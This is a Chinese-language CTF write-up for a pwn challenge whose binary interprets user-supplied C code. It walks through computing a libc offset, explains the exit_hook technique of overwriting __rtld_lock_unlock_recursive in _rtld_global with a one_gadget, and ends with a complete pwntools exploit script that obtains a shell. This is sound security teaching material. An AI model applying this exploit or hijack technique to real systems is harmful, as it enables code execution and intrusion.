# 分析

远程已经打不通了，远程的偏移和本地的偏移不一样，只能复现一下本地的了。

首先看到流程图,代码量很大，有很大的switch语句和嵌套结构，可能是虚拟机或者是解析器。

<img src="D:/blog/source/_posts/网鼎杯部分wp/1.png" style="zoom:67%;" />

从下图看出是一个C语言的解析器。

<img src="D:/blog/source/_posts/网鼎杯部分wp/2.png" style="zoom:67%;" />

然后看了几个函数

sub_B70解析了一些8，10，16进制数之类的。

经过调试，发现需要定义main函数而且需要;结束，函数只能运行一次,有exit函数

![](D:/blog/source/_posts/网鼎杯部分wp/3.png)

ps：

进程的内存会被分成几个段

1.代码段（text）用于存放代码（指令）。

2.数据段（data）用于存放初始化了的数据，如`int i = 10;`，就需要存放到数据段中。

3.未初始化数据段（bss）用于存放未初始化的数据，如 `int i[1000];`，因为不关心其中的真正数值，所以单独存放可以节省空间，减少程序的体积。

4.栈（stack）用于处理函数调用相关的数据，如调用帧（calling frame）或是函数的局部变量等。

5.堆（heap）用于为程序动态分配内存。

在内存中的位置类似于下图

```
+------------------+
|    stack   |     |      high address
|    ...     v     |
|                  |
|                  |
|                  |
|                  |
|    ...     ^     |
|    heap    |     |
+------------------+
| bss  segment     |
+------------------+
| data segment     |
+------------------+
| text segment     |      low address
+------------------+
```

其中的数据段我们只用来存放字符串，因为编译器并不支持初始化变量，因此我们也不需要未初始化数据段。当用户的程序需要分配内存时，理论上我们的虚拟机需要维护一个堆用于内存分配，但实际实现上较为复杂且与编译无关，故我们引入一个指令`MSET`，使我们能直接使用编译器中的内存。

综上，需要首先在全局添加代码

```
int *text,            // text segment
    *old_text,        // for dump text segment
    *stack;           // stack
char *data;           // data segment
```

虽然是`int`型，但是是作为无符号的整型，因为我们会在代码段（text）中存放如指针/内存地址的数据，它们就是无符号的。其中数据段（data）由于只存放字符串，所以是 `char *` 型的。

接着，在`main`函数中加入初始化代码，真正为其分配内存

```c
int main() {
    close(fd);
    ...
    // allocate memory for virtual machine
    if (!(text = old_text = malloc(poolsize))) {
        printf("could not malloc(%d) for text area\n", poolsize);
        return -1;
    }
    if (!(data = malloc(poolsize))) {
        printf("could not malloc(%d) for data area\n", poolsize);
        return -1;
    }
    if (!(stack = malloc(poolsize))) {
        printf("could not malloc(%d) for stack area\n", poolsize);
        return -1;
    }
    memset(text, 0, poolsize);
    memset(data, 0, poolsize);
    memset(stack, 0, poolsize);
    ...
    program();
}
```

# 计算偏移

c语言定义在main函数外的指针是在libc里的，拥有libc的地址。定义一个s，输入内容，让它拥有地址，然后打印出它的地址，得到两个地址的差就是偏移了。

![](D:/blog/source/_posts/网鼎杯部分wp/10.png)

```python
from pwn import*
r = process('./pwn')
#r = remote('182.92.73.10',24573)
context.log_level ='debug'
gdb.attach(r)
payload = '''
char *s;
char *libcbase;
char *p;
int main()
{
    s = "aaaa";
    printf("%p ", s);
}
'''
payload = payload.replace('\n','')
r.sendline(payload)
r.interactive()
```

![](D:/blog/source/_posts/网鼎杯部分wp/4.png)

![](D:/blog/source/_posts/网鼎杯部分wp/5.png)

s相对于libcbase的偏移为0x7ffff7f17028 - 0x7ffff7a0d000

# 计算exit_hook的偏移

gdb,用p _rtld_global

![](D:/blog/source/_posts/网鼎杯部分wp/6.png)

调整让[_rtld_global+8] == 0,这样s指向了rtld_global+8的位置

```c
s = "aaaa";
libcbase = s - (0x7ffff7f17028 - 0x7ffff7a0d000);
s = libcbase + 6229832 - 3848 + 8;
```

让 * s = 0 即（*s ==s[0]）

然后让s重新指向exit_hook

```
s[0] = 0;
s = libcbase + 6229832;
```

之后

```
p = libcbase + 0xcd0f3;
s[0] = p&0xff;
s[1] = (p>>8)&0xff;
s[2] = (p>>16)&0xff;
```

ps:

exit_hook攻击

更改exit()某一结构体,可以实现exit()函数的劫持

exit()源代码

![](D:/blog/source/_posts/网鼎杯部分wp/7.png)

调用`__run_exit_handlers`函数,查看源代码

```c
while (cur->idx > 0)
{
  struct exit_function *const f = &cur->fns[--cur->idx];
  const uint64_t new_exitfn_called = __new_exitfn_called;

  /* Unlock the list while we call a foreign function.  */
  __libc_lock_unlock (__exit_funcs_lock);
  switch (f->flavor)
    {
      void (*atfct) (void);    
      void (*onfct) (int status, void *arg);  
      void (*cxafct) (void *arg, int status);  

    case ef_free:
    case ef_us:
      break;
    case ef_on:
      onfct = f->func.on.fn;
```

关键的三个call

```c
void (*atfct) (void);    
void (*onfct) (int status, void *arg);  
void (*cxafct) (void *arg, int status);
```

gdb动调有跳转

<img src="D:/blog/source/_posts/网鼎杯部分wp/8.png" style="zoom:67%;" />

调用了`_dl_fini`函数，查看`_dl_fini`函数源代码。

```c
#ifdef SHARED
  int do_audit = 0;
 again:
#endif
  for (Lmid_t ns = GL(dl_nns) - 1; ns >= 0; --ns)
    {
      /* Protect against concurrent loads and unloads.  */
      __rtld_lock_lock_recursive (GL(dl_load_lock));

      unsigned int nloaded = GL(dl_ns)[ns]._ns_nloaded;
      /* No need to do anything for empty namespaces or those used for
	 auditing DSOs.  */
      if (nloaded == 0
#ifdef SHARED
	  || GL(dl_ns)[ns]._ns_loaded->l_auditing != do_audit
#endif
	  )
	__rtld_lock_unlock_recursive (GL(dl_load_lock));
```

两个关键函数

```c
 __rtld_lock_lock_recursive (GL(dl_load_lock));
__rtld_lock_unlock_recursive (GL(dl_load_lock));
```

`__rtld_lock_unlock_recursive`定义

```c
#  define GL(name) _rtld_local._##name
# else
#  define GL(name) _rtld_global._##namec
```

有`_rtld_global`结构体，p _rtld_global

<img src="D:/blog/source/_posts/网鼎杯部分wp/9.png" style="zoom:67%;" />

找到函数地址存放位置，则`__rtld_lock_unlock_recursive`为`_rtld_global`结构题的指针变量。在exit()中执行流程为
`exit()->__run_exit_handlers->_dl_fini->__rtld_lock_unlock_recursive`
由于`__rtld_lock_unlock_recursive`存放在结构体空间，为可读可写，那么如果可以修改`__rtld_lock_unlock_recursive`,就可以在调用exit()时劫持程序流。
`_rtld_lock_lock_recursive`也是一样的流程。



所以取出 libc里面的一个函数指针， 然后跳转过去， 写这个函数指针为 one_gadget , 然后调用exit 时就会拿到 shell。也就是将将_rtld_global结构体中的__rtld_unlock_recursive劫持为one_gadget就行。结构体在libc中，所需要一个字节一个字节的改，后三位改成one_gadget就能在执行exit函数时getshell了。

# exp

```python
from pwn import*
r = process('./pwn')
#r = remote('182.92.73.10',24573)
context.log_level ='debug'
gdb.attach(r)
payload = '''
char *s;
char *libcbase;
char *p;
int main()
{
    s = "aaaa";
	libcbase = s - (0x7ffff7f17028 - 0x7ffff7a0d000);
	s = libcbase + 6229832 - 3848 + 8;
	s[0] = 0;
	s = libcbase + 6229832;
	p = libcbase + 0xcd0f3;
	s[0] = p&0xff;
	s[1] = (p>>8)&0xff;
	s[2] = (p>>16)&0xff;
	printf("%p ", s);    
}
'''
payload = payload.replace('\n','')
r.sendline(payload)
r.interactive()
```

